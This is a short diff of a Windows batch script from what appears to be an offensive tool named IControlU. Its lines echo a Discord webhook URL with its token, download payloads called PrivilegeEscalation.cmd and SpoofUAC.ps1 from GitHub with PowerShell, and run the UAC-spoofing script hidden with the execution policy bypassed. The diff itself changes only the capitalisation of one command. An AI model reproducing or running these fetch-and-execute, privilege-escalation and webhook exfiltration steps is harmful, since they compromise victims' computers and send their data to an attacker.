@@ -15,7 +15,7 @@ echo https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/SpoofUAC.ps1' -OutFile 'SpoofUAC.ps1'"
 
-PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File .\SpoofUAC.ps1
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File .\SpoofUAC.ps1
 
 @REM @REM Delete the Discord Webhook file
 @REM del "DiscordWebhookURL.icu"
